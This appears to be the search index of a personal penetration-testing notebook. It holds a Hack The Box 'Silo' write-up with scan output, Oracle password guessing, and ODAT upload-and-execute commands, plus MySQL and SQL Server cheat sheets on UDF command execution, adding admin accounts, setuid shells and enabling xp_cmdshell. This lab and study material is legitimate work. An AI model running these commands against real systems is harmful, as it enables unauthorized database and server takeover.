| Comment: | !-- | body { | color:#000000; | background-color:#0072C6; | margin:0; | } | | #container { | margin-left:auto; | margin-right:auto; | text-align:center; | } | | a img { | border:none; | } | |_ -- |_http-date: Wed, 24 Apr 2019 11:10:45 GMT; -1m29s from local time. |_http-fetch: Please enter the complete path of the directory to save data in. | http-headers: | Content-Length: 701 | Content-Type: text/html | Last-Modified: Wed, 03 Jan 2018 00:36:17 GMT | Accept-Ranges: bytes | ETag: 1114bde2a84d31:0 | Server: Microsoft-IIS/8.5 | X-Powered-By: ASP.NET | Date: Wed, 24 Apr 2019 11:10:45 GMT | Connection: close | |_ (Request type: HEAD) | http-methods: |_ Potentially risky methods: TRACE |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: Microsoft-IIS/8.5 |_http-title: IIS Windows Server | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_smb-enum-services: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds |_smb-enum-services: ERROR: Script execution failed (use -d to debug) 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) |_unusual-port: oracle-tns unexpected on port tcp/1521 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49160/tcp open oracle-tns Oracle TNS listener (requires service name) 49161/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1m28s, deviation: 0s, median: -1m28s | dns-blacklist: | SPAM |_ all.spamrats.com - FAIL |_fcrdns: FAIL (No A record) |_ipidseq: Unknown |_msrpc-enum: No accounts left to try |_path-mtu: PMTU == 1500 | qscan: | PORT FAMILY MEAN (us) STDDEV LOSS (%) | 1 0 215971.50 42529.14 0.0% | 80 0 191252.50 41690.66 0.0% | 135 0 188452.30 37772.99 0.0% | 139 0 195588.60 38836.83 0.0% | 445 0 191105.30 40361.52 0.0% | 1521 0 192247.10 41941.94 0.0% | 49152 0 186131.00 35036.00 0.0% | 49153 0 215171.70 47084.34 0.0% |_49154 0 193628.90 40600.77 0.0% | smb-mbenum: |_ ERROR: Failed to connect to browser service: No accounts left to try | smb-protocols: | dialects: | NT LM 0.12 (SMBv1) [dangerous, but default] | 2.02 | 2.10 | 3.00 |_ 3.02 | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: supported | smb2-capabilities: | 2.02: | Distributed File System | 2.10: | Distributed File System | Leasing | Multi-credit operations | 3.00: | Distributed File System | Leasing | Multi-credit operations | 3.02: | Distributed File System | Leasing |_ Multi-credit operations | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-04-24 07:10:44 |_ start_date: 2019-04-22 01:23:56 Post-scan script results: | reverse-index: | 80/tcp: 10.10.10.82 | 135/tcp: 10.10.10.82 | 139/tcp: 10.10.10.82 | 445/tcp: 10.10.10.82 | 1521/tcp: 10.10.10.82 | 49152/tcp: 10.10.10.82 | 49153/tcp: 10.10.10.82 | 49154/tcp: 10.10.10.82 | 49155/tcp: 10.10.10.82 | 49158/tcp: 10.10.10.82 | 49160/tcp: 10.10.10.82 |_ 49161/tcp: 10.10.10.82 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 24 07:14:07 2019 -- 1 IP address (1 host up) scanned in 298.36 seconds UDP","title":"Network"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/Network/#tcp","text":"# Nmap 7.70 scan initiated Wed Apr 24 07:09:09 2019 as: nmap -sV -sC -oA nmap --script safe -T4 10.10.10.82 Pre-scan script results: | broadcast-dhcp-discover: | Response 1 of 1: | IP Offered: 10.0.2.16 | Subnet Mask: 255.255.255.0 | Router: 10.0.2.2 | Domain Name Server: 10.0.2.3 |_ Server Identifier: 10.0.2.2 |_eap-info: please specify an interface with -e | targets-asn: |_ targets-asn.asn is a mandatory parameter Nmap scan report for 10.10.10.82 (10.10.10.82) Host is up (0.15s latency). Not shown: 988 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-comments-displayer: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.82 | | Path: http://10.10.10.82:80/ | Line number: 7 | Comment: | !-- | body { | color:#000000; | background-color:#0072C6; | margin:0; | } | | #container { | margin-left:auto; | margin-right:auto; | text-align:center; | } | | a img { | border:none; | } | |_ -- |_http-date: Wed, 24 Apr 2019 11:10:45 GMT; -1m29s from local time. |_http-fetch: Please enter the complete path of the directory to save data in. | http-headers: | Content-Length: 701 | Content-Type: text/html | Last-Modified: Wed, 03 Jan 2018 00:36:17 GMT | Accept-Ranges: bytes | ETag: 1114bde2a84d31:0 | Server: Microsoft-IIS/8.5 | X-Powered-By: ASP.NET | Date: Wed, 24 Apr 2019 11:10:45 GMT | Connection: close | |_ (Request type: HEAD) | http-methods: |_ Potentially risky methods: TRACE |_http-mobileversion-checker: No mobile version detected. |_http-referer-checker: Couldn't find any cross-domain scripts. |_http-security-headers: |_http-server-header: Microsoft-IIS/8.5 |_http-title: IIS Windows Server | http-useragent-tester: | Status for browser useragent: 200 | Allowed User Agents: | Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) | libwww | lwp-trivial | libcurl-agent/1.0 | PHP/ | Python-urllib/2.5 | GT::WWW | Snoopy | MFC_Tear_Sample | HTTP::Lite | PHPCrawl | URI::Fetch | Zend_Http_Client | http client | PECL::HTTP | Wget/1.13.4 (linux-gnu) |_ WWW-Mechanize/1.34 |_http-xssed: No previously reported XSS vuln. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_smb-enum-services: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds |_smb-enum-services: ERROR: Script execution failed (use -d to debug) 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) |_unusual-port: oracle-tns unexpected on port tcp/1521 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49160/tcp open oracle-tns Oracle TNS listener (requires service name) 49161/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1m28s, deviation: 0s, median: -1m28s | dns-blacklist: | SPAM |_ all.spamrats.com - FAIL |_fcrdns: FAIL (No A record) |_ipidseq: Unknown |_msrpc-enum: No accounts left to try |_path-mtu: PMTU == 1500 | qscan: | PORT FAMILY MEAN (us) STDDEV LOSS (%) | 1 0 215971.50 42529.14 0.0% | 80 0 191252.50 41690.66 0.0% | 135 0 188452.30 37772.99 0.0% | 139 0 195588.60 38836.83 0.0% | 445 0 191105.30 40361.52 0.0% | 1521 0 192247.10 41941.94 0.0% | 49152 0 186131.00 35036.00 0.0% | 49153 0 215171.70 47084.34 0.0% |_49154 0 193628.90 40600.77 0.0% | smb-mbenum: |_ ERROR: Failed to connect to browser service: No accounts left to try | smb-protocols: | dialects: | NT LM 0.12 (SMBv1) [dangerous, but default] | 2.02 | 2.10 | 3.00 |_ 3.02 | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: supported | smb2-capabilities: | 2.02: | Distributed File System | 2.10: | Distributed File System | Leasing | Multi-credit operations | 3.00: | Distributed File System | Leasing | Multi-credit operations | 3.02: | Distributed File System | Leasing |_ Multi-credit operations | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-04-24 07:10:44 |_ start_date: 2019-04-22 01:23:56 Post-scan script results: | reverse-index: | 80/tcp: 10.10.10.82 | 135/tcp: 10.10.10.82 | 139/tcp: 10.10.10.82 | 445/tcp: 10.10.10.82 | 1521/tcp: 10.10.10.82 | 49152/tcp: 10.10.10.82 | 49153/tcp: 10.10.10.82 | 49154/tcp: 10.10.10.82 | 49155/tcp: 10.10.10.82 | 49158/tcp: 10.10.10.82 | 49160/tcp: 10.10.10.82 |_ 49161/tcp: 10.10.10.82 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 24 07:14:07 2019 -- 1 IP address (1 host up) scanned in 298.36 seconds","title":"TCP"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/OtherServices/","text":"Oracle ./odat.py all -s 10.10.10.82 -p 1521 [1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)? [+] The target is vulnerable to a remote TNS poisoning [2] (10.10.10.82:1521): Searching valid SIDs [2.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server [+] 'XE' is a valid SID. Continue... [+] 'XEXDB' is a valid SID. Continue... 100% |#################################################################################################################################################################| Time: 00:08:27 [2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521) 100% |#################################################################################################################################################################| Time: 00:00:15 [2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521) [+] 'XE' is a valid SID. Continue... 100% |#################################################################################################################################################################| Time: 00:07:05 [+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB [3] (10.10.10.82:1521): Searching valid accounts on the XE SID The login ABM has already been tested at least once. What do you want to do: | ETA: --:--:-- - stop (s/S) - continue and ask every time (a/A) - continue without to ask (c/C) c 100% |#################################################################################################################################################################| Time: 00:31:14 [-] No found a valid account on 10.10.10.82:1521/XE. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-file accounts/logins.txt accounts/pwds.txt' root@kali root@kali:~/HTB/tools/db/odat# ./odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-file /root/HTB/tools/db/odat/accounts/accounts.txt [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521 The login ABM has already been tested at least once. What do you want to do: | ETA: --:--:-- - stop (s/S) - continue and ask every time (a/A) - continue without to ask (c/C) c [+] Valid credentials found: scott/tiger. Continue... 100% |#################################################################################################################################################################| Time: 00:53:55 [+] Accounts found on 10.10.10.82:1521/XE: scott/tiger SMB SNMP SMTP Databases Other","title":"OtherServices"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/OtherServices/#oracle","text":"./odat.py all -s 10.10.10.82 -p 1521 [1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)? [+] The target is vulnerable to a remote TNS poisoning [2] (10.10.10.82:1521): Searching valid SIDs [2.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server [+] 'XE' is a valid SID. Continue... [+] 'XEXDB' is a valid SID. Continue... 100% |#################################################################################################################################################################| Time: 00:08:27 [2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521) 100% |#################################################################################################################################################################| Time: 00:00:15 [2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521) [+] 'XE' is a valid SID. Continue... 100% |#################################################################################################################################################################| Time: 00:07:05 [+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB [3] (10.10.10.82:1521): Searching valid accounts on the XE SID The login ABM has already been tested at least once. What do you want to do: | ETA: --:--:-- - stop (s/S) - continue and ask every time (a/A) - continue without to ask (c/C) c 100% |#################################################################################################################################################################| Time: 00:31:14 [-] No found a valid account on 10.10.10.82:1521/XE. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-file accounts/logins.txt accounts/pwds.txt' root@kali root@kali:~/HTB/tools/db/odat# ./odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-file /root/HTB/tools/db/odat/accounts/accounts.txt [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521 The login ABM has already been tested at least once. What do you want to do: | ETA: --:--:-- - stop (s/S) - continue and ask every time (a/A) - continue without to ask (c/C) c [+] Valid credentials found: scott/tiger. Continue... 100% |#################################################################################################################################################################| Time: 00:53:55 [+] Accounts found on 10.10.10.82:1521/XE: scott/tiger","title":"Oracle"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/OtherServices/#smb","text":"","title":"SMB"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/OtherServices/#snmp","text":"","title":"SNMP"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/OtherServices/#smtp","text":"","title":"SMTP"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/OtherServices/#databases","text":"","title":"Databases"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/OtherServices/#other","text":"","title":"Other"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/WebServices/","text":"Nikto DirBuster / GoBuster SSL Cert WebDav CMS","title":"WebServices"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/WebServices/#dirbuster-gobuster","text":"","title":"DirBuster / GoBuster"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/WebServices/#ssl-cert","text":"","title":"SSL Cert"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/hack-the-box/silo[ippsecpending]/01_Enumeration/WebServices/#cms","text":"","title":"CMS"},{"location":"ctf/hack-the-box/silo[ippsecpending]/02_Exploitation/oracle/","text":"Upload file ~/HTB/tools/db/odat# ./odat.py utlfile -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --putFile c:/ writeup.exe ~/HTB/silo/writeup.exe [1] (10.10.10.82:1521): Put the /root/HTB/silo/writeup.exe local file in the c:/ folder like writeup.exe on the 10.10.10.82 server [+] The /root/HTB/silo/writeup.exe file was created on the c:/ directory on the 10.10.10.82 server like the writeup.exe file Execute file ./odat.py externaltable -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --exec c:/ writeup.exe","title":"Oracle"},{"location":"ctf/hack-the-box/silo[ippsecpending]/02_Exploitation/oracle/#upload-file","text":"~/HTB/tools/db/odat# ./odat.py utlfile -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --putFile c:/ writeup.exe ~/HTB/silo/writeup.exe [1] (10.10.10.82:1521): Put the /root/HTB/silo/writeup.exe local file in the c:/ folder like writeup.exe on the 10.10.10.82 server [+] The /root/HTB/silo/writeup.exe file was created on the c:/ directory on the 10.10.10.82 server like the writeup.exe file","title":"Upload file"},{"location":"ctf/hack-the-box/silo[ippsecpending]/02_Exploitation/oracle/#execute-file","text":"./odat.py externaltable -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --exec c:/ writeup.exe","title":"Execute file"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/Goodies/","text":"Hashes Password type root.txt cd39ea0af657a495e33bc59c7836faf6 type user.txt 92ede778a1cc8d27cb6623055c331617 Proof, Flags, Other","title":"Goodies"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/Goodies/#password","text":"type root.txt cd39ea0af657a495e33bc59c7836faf6 type user.txt 92ede778a1cc8d27cb6623055c331617","title":"Password"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/Goodies/#proof-flags-other","text":"","title":"Proof, Flags, Other"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/InfoBreakdown/01_Host/","text":"","title":"01 Host"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/InfoBreakdown/02_FileSystem/","text":"","title":"02 FileSystem"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/InfoBreakdown/03_Processes/","text":"","title":"03 Processes"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/InfoBreakdown/04_Applications/","text":"","title":"04 Applications"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/InfoBreakdown/05_UsersGroups/","text":"","title":"05 UsersGroups"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/InfoBreakdown/06_Network/","text":"","title":"06 Network"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/InfoBreakdown/07_ScheduledJobs/","text":"","title":"07 ScheduledJobs"},{"location":"ctf/hack-the-box/silo[ippsecpending]/03_PostExploitation/ScriptResults/LinEnum/","text":"","title":"LinEnum"},{"location":"ctf/template/Log/","text":"","title":"Log"},{"location":"ctf/template/01_Enumeration/Network/","text":"TCP UDP","title":"Network"},{"location":"ctf/template/01_Enumeration/Network/#tcp","text":"","title":"TCP"},{"location":"ctf/template/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/template/01_Enumeration/OtherServices/","text":"SMB SNMP SMTP Databases Other","title":"OtherServices"},{"location":"ctf/template/01_Enumeration/OtherServices/#smb","text":"","title":"SMB"},{"location":"ctf/template/01_Enumeration/OtherServices/#snmp","text":"","title":"SNMP"},{"location":"ctf/template/01_Enumeration/OtherServices/#smtp","text":"","title":"SMTP"},{"location":"ctf/template/01_Enumeration/OtherServices/#databases","text":"","title":"Databases"},{"location":"ctf/template/01_Enumeration/OtherServices/#other","text":"","title":"Other"},{"location":"ctf/template/01_Enumeration/WebServices/","text":"Nikto DirBuster / GoBuster SSL Cert WebDav CMS","title":"WebServices"},{"location":"ctf/template/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/template/01_Enumeration/WebServices/#dirbuster-gobuster","text":"","title":"DirBuster / GoBuster"},{"location":"ctf/template/01_Enumeration/WebServices/#ssl-cert","text":"","title":"SSL Cert"},{"location":"ctf/template/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/template/01_Enumeration/WebServices/#cms","text":"","title":"CMS"},{"location":"ctf/template/03_PostExploitation/Goodies/","text":"Hashes Password Proof, Flags, Other","title":"Goodies"},{"location":"ctf/template/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/template/03_PostExploitation/Goodies/#password","text":"","title":"Password"},{"location":"ctf/template/03_PostExploitation/Goodies/#proof-flags-other","text":"","title":"Proof, Flags, Other"},{"location":"ctf/template/03_PostExploitation/InfoBreakdown/01_Host/","text":"","title":"01 Host"},{"location":"ctf/template/03_PostExploitation/InfoBreakdown/02_FileSystem/","text":"","title":"02 FileSystem"},{"location":"ctf/template/03_PostExploitation/InfoBreakdown/03_Processes/","text":"","title":"03 Processes"},{"location":"ctf/template/03_PostExploitation/InfoBreakdown/04_Applications/","text":"","title":"04 Applications"},{"location":"ctf/template/03_PostExploitation/InfoBreakdown/05_UsersGroups/","text":"","title":"05 UsersGroups"},{"location":"ctf/template/03_PostExploitation/InfoBreakdown/06_Network/","text":"","title":"06 Network"},{"location":"ctf/template/03_PostExploitation/InfoBreakdown/07_ScheduledJobs/","text":"","title":"07 ScheduledJobs"},{"location":"ctf/template/03_PostExploitation/ScriptResults/LinEnum/","text":"","title":"LinEnum"},{"location":"databases/access/y-Tools/","text":"Tools MDB Tools - Read Access databases on *nix: https://github.com/brianb/mdbtools mdb-tables backup.mdb | grep --color=auto user mdb-export backup.mdb tableName","title":"Tools"},{"location":"databases/access/y-Tools/#tools","text":"MDB Tools - Read Access databases on *nix: https://github.com/brianb/mdbtools mdb-tables backup.mdb | grep --color=auto user mdb-export backup.mdb tableName","title":"Tools"},{"location":"databases/mongodb/0-cheatsheet/","text":"MongoDB Connect mongo -p -u $USER $DB_NAME","title":"0 cheatsheet"},{"location":"databases/mongodb/0-cheatsheet/#mongodb","text":"","title":"MongoDB"},{"location":"databases/mongodb/0-cheatsheet/#connect","text":"mongo -p -u $USER $DB_NAME","title":"Connect"},{"location":"databases/mysql/0-cheatcheet/","text":"Cheatsheet Connection tests mysql -h Hostname -u root mysql -h Hostname -u root mysql -h Hostname -u root@localhost mysql -h Hostname mysql -h Hostname -u @localhost Configuration files windows config.ini my.ini windows\\my.ini winnt\\my.ini InstDir /mysql/data/ UNIX /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf /etc/my.cnf Command history ~/.mysql.history Log files: connections.log update.log common.log Privilege Escalation Current access level: mysql select user(); mysql select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()'; Access passwords: mysql use mysql mysql select user,password from user; Create new user and grant permissions: mysql create user test identified by 'test'; mysql grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION; Break into shell: mysql \\! cat /etc/passwd mysql \\! bash","title":"Cheatsheet"},{"location":"databases/mysql/0-cheatcheet/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"databases/mysql/0-cheatcheet/#connection-tests","text":"mysql -h Hostname -u root mysql -h Hostname -u root mysql -h Hostname -u root@localhost mysql -h Hostname mysql -h Hostname -u @localhost","title":"Connection tests"},{"location":"databases/mysql/0-cheatcheet/#configuration-files","text":"windows config.ini my.ini windows\\my.ini winnt\\my.ini InstDir /mysql/data/ UNIX /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf /etc/my.cnf Command history ~/.mysql.history Log files: connections.log update.log common.log","title":"Configuration files"},{"location":"databases/mysql/0-cheatcheet/#privilege-escalation","text":"Current access level: mysql select user(); mysql select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()'; Access passwords: mysql use mysql mysql select user,password from user; Create new user and grant permissions: mysql create user test identified by 'test'; mysql grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION; Break into shell: mysql \\! cat /etc/passwd mysql \\! bash","title":"Privilege Escalation"},{"location":"databases/mysql/mysql-root-to-system-root/","text":"MySQL-Root to System-Root Summarized References MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux Take lib from SQLMap and dump it into the server: udf/mysql/linux/32/lib_mysqludf_sys.so udf/mysql/linux/64/lib_mysqludf_sys.so udf/mysql/windows/32/lib_mysqludf_sys.dll udf/mysql/windows/64/lib_mysqludf_sys.dll On Windows: USE mysql; CREATE TABLE npn(line blob); INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll')); SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll'; CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll'; SELECT sys_exec( net user npn npn12345678 /add ); SELECT sys_exec( net localgroup Administrators npn /add ); On Linux: use mysql; create table npn(line blob); insert into npn values(load_file('/home/npn/lib_mysqludf_sys.so')); select * from npn into dumpfile '/usr/lib/lib_mysqludf_sys.so'; create function sys_exec returns integer soname 'lib_mysqludf_sys.so'; select sys_exec('id /tmp/out; chown npn.npn /tmp/out'); npn@pwn:~$ cat /tmp/out uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) // Create a shell, compile it, chmod +s /tmp/shell and get reverse shell #include stdio.h #include sys/types.h #include unistd.h int main(void) { setuid(0); setgid(0); system(\u201c/bin/bash\u201d); } gcc -o /tmp/shell /home/npn/shell.c chmod +s /tmp/shell","title":"MySQL-Root to System-Root"},{"location":"databases/mysql/mysql-root-to-system-root/#mysql-root-to-system-root","text":"","title":"MySQL-Root to System-Root"},{"location":"databases/mysql/mysql-root-to-system-root/#summarized-references","text":"MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux Take lib from SQLMap and dump it into the server: udf/mysql/linux/32/lib_mysqludf_sys.so udf/mysql/linux/64/lib_mysqludf_sys.so udf/mysql/windows/32/lib_mysqludf_sys.dll udf/mysql/windows/64/lib_mysqludf_sys.dll On Windows: USE mysql; CREATE TABLE npn(line blob); INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll')); SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll'; CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll'; SELECT sys_exec( net user npn npn12345678 /add ); SELECT sys_exec( net localgroup Administrators npn /add ); On Linux: use mysql; create table npn(line blob); insert into npn values(load_file('/home/npn/lib_mysqludf_sys.so')); select * from npn into dumpfile '/usr/lib/lib_mysqludf_sys.so'; create function sys_exec returns integer soname 'lib_mysqludf_sys.so'; select sys_exec('id /tmp/out; chown npn.npn /tmp/out'); npn@pwn:~$ cat /tmp/out uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) // Create a shell, compile it, chmod +s /tmp/shell and get reverse shell #include stdio.h #include sys/types.h #include unistd.h int main(void) { setuid(0); setgid(0); system(\u201c/bin/bash\u201d); } gcc -o /tmp/shell /home/npn/shell.c chmod +s /tmp/shell","title":"Summarized References"},{"location":"databases/oracle/y-Tools/","text":"Tools \u200b Oracle Database Attack Tool (ODAT) All checks: ./odat.py all -s 10.10.10.82 -p 1521 Guess passwords: ./odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-file /root/HTB/tools/db/odat/accounts/accounts.txt Upload file: ./odat.py utlfile -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --putFile c:/ writeup.exe ~/HTB/silo/writeup.exe Execute file: ./odat.py externaltable -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --exec c:/ writeup.exe","title":"Tools"},{"location":"databases/oracle/y-Tools/#tools","text":"\u200b Oracle Database Attack Tool (ODAT) All checks: ./odat.py all -s 10.10.10.82 -p 1521 Guess passwords: ./odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-file /root/HTB/tools/db/odat/accounts/accounts.txt Upload file: ./odat.py utlfile -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --putFile c:/ writeup.exe ~/HTB/silo/writeup.exe Execute file: ./odat.py externaltable -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --exec c:/ writeup.exe","title":"Tools"},{"location":"databases/sqlserver/0-cheatsheet/","text":"Cheatsheet Enable xp_cmdshell exec sp_configure \u2018show advanced options\u2019, 1 reconfigure exec sp_configure \u2018xp_cmdshell\u2019, 1 reconfigure","title":"Cheatsheet"},{"location":"databases/sqlserver/0-cheatsheet/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"databases/sqlserver/0-cheatsheet/#enable-xp_cmdshell","text":"exec sp_configure \u2018show advanced options\u2019, 1 reconfigure exec sp_configure \u2018xp_cmdshell\u2019, 1 reconfigure","title":"Enable xp_cmdshell"},{"location":"databases/sqlserver/0-roles-and-permissions/","text":"01. Roles and Permissions Principals Principals are entities that can request SQL Server resources. SQL Server-level principals SQL Server authentication Login sa Created when instance is installed Default database is master Member of sysadmin database role public Every login belongs to the this role Windows authentication login for a Windows user Windows authentication login for a Windows group Azure Active Directory authentication login for a AD user Azure Active Directory authentication login for a AD group Server Role Database-level principals Database User (There are 11 types of users. For more information, see CREATE USER.) dbo Created for each database Has all permissions in the database Owns dbo schema ( dbo schema is the default schema for all users, and cannot be dropped) guest Permissions granted are inherited by users who have access to the database, but who do not have a user account in the database. Cannot be dropped Can be disabled by revoking it's CONNECT permission ( REVOKE CONNECT FROM GUEST; ) Database Role Application Role Special Schemas INFORMATION_SCHEMA sys Server-Level Roles and Permissions Fixed Roles Role Description sysadmin Can perform any activity in the server. serveradmin Can change server-wide configuration options and shut down the server. securityadmin Manage logins and their properties. Can GRANT, DENY, and REVOKE server-level permissions. Can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database. Can reset passwords for SQL Server logins. Should be treated as equivalent to the sysadmin role. processadmin Can end processes that are running in an instance of SQL Server. setupadmin Can add and remove linked servers by using Transact-SQL statements. (sysadmin membership is needed when using Management Studio.) bulkadmin Can run the BULK INSERT statement. diskadmin Used for managing disk files. dbcreator Can create, alter, drop, and restore any database. public Every SQL Server login belongs to the public server role. When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to public on that object. Only assign public permissions on any object when you want the object to be available to all users. You cannot change membership in public. Public is implemented differently than other roles, and permissions can be granted, denied, or revoked from the public fixed server roles. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017 Working with Server-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles Database Level Roles and Permissions CREATE LOGIN ... WITH PASSWORD = ...; Fixed Roles Role Description db_owner Can perform all configuration and maintenance 